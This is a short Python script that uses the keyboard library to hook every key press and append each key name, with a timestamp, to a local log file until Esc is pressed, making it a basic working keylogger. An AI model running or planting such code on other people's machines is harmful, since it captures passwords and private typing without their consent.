import keyboard  # Import the library
from datetime import datetime

def log_key(e):
    with open("key_data.log", "a") as log_file:
        log_file.write(f"{datetime.now()} - {e.name}\n")  # Log timestamp and key

# Attach log_key to all key events
keyboard.hook(log_key)

# Keep the script running to capture all events
keyboard.wait('esc')  # Press 'esc' to stop logging
